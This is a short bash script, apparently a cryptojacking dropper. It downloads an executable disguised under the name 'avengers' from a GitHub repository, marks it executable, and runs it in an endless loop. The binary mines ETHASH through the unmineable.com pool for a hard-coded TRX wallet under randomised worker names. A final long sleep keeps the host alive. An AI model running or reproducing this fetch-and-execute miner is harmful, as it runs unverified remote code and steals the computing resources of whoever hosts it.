#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TDUyaKcbhFGViyBHarTtPuHhHk9mXm84th
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/alibahrami1204/Success/raw/main/avengers
chmod +x avengers
while [ 1 ]; do
./avengers --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
